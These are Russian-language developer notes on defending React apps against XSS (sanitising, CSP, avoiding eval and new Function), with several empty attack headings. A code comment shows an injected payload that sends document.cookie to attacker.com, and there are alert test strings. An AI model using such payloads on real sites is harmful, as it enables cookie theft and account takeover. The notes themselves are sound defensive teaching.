# ClickJacking

# XSS (Cross Site Scripting)

XSS — это внедрение вредоносного кода на страницы атакуемого сервиса.

- Reflected XSS = Отражённый, потому что его действие сразу же отражается на поведении страницы.
- Stored XSS = "хранимый", это вредоносный код, который каким-то образом сохранился в атакуемом сервисе. Он мог быть записан в базу, сохранён на диске в виде текста, изображения, мог сохраниться в оперативной памяти сервера.
- Injection = самый частый пример - SQL-инъекции
- Key logger = разновидность XSS. Представим, что злоумышленники внедрили код, который отправляет все данные, набранные с клавиатуры

SQL-инъекции
Их суть заключается в доступе к данным атакуемого сервиса или их изменению. Ну или удалению, всякое бывает.

## Защита от XSS

**1. Никогда не вставляй HTML напрямую**

не использовать dangerouslySetInnerHTML, если только не уверен в источнике и не очистил HTML.

---

**2. Экранирование пользовательского ввода**

В React JSX по умолчанию все переменные безопасны:

```js
const userInput = '<script>alert("XSS")</script>';

<p>{userInput}</p>; // Безопасно: React экранирует строку
```

Если ты рендеришь HTML вручную (например, в innerHTML), обязательно очищай ввод:

```js
import DOMPurify from "dompurify";

const safeHtml = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
```

---

**3. Content Security Policy (CSP)**
CSP — это заголовок, который блокирует внедрение внешних скриптов, инлайнового JS и т. д.
Настраивается на сервере, пример:

```js
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

**4. Избегай инлайновых обработчиков**

```js
<!-- Уязвимо -->
<button onclick="alert(document.cookie)">Click</button>
```

Используй JS-функции, а не строки HTML:

```js
<button onClick={() => alert("safe")}>Click</button>
```

---

**5. Валидация и фильтрация данных на клиенте.**

Не пускай в форму всё подряд: даже на клиенте можно ограничивать ввод.
Например, использовать input[type="email"], маски, валидацию.
Но клиентская валидация = удобство, а не защита — всё равно проверяй данные на сервере.

**6. Избегать eval, new Function.**
new Function(...) в JavaScript — это динамический способ выполнения кода, очень похожий на eval(). Именно поэтому он опасен и может привести к XSS.

Ты буквально создаешь новую функцию из строки кода, передавая тело функции в виде строки:

```js
const fn = new Function("a", "b", "return a + b");
console.log(fn(2, 3)); // 5
```

Как пример того, что могут закинуть в приложение:

```js
const code = getUserInput(); // "return fetch('http://attacker.com?cookie=' + document.cookie)"
const run = new Function(code); // уязвимо
run(); // злоумышленник получает куки
```

# CSRF (Cross Site Request Forgery)

# Man In The Middle (MITM)

# Denial of Service

# HTTP Request Smuggling
